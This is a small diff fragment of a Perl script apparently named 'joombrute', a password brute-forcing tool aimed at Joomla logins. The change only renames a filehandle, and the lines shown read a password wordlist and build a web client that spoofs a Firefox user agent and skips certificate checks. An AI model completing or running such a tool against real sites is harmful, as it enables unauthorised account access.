@@ -10,8 +10,8 @@ joombrute($ARGV[0],$ARGV[2],$ARGV[1]);
 
 sub joombrute { 
 
-open(tarrget,"<$_[1]") or die "$!";
-while(<tarrget>){
+open(password,"<$_[1]") or die "$!";
+while(<password>){
 chomp($password = $_);
 
 $ua = LWP::UserAgent->new( agent => "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1) Gecko/20090624 Firefox/3.5", ssl_opts => { verify_hostname => 0 });
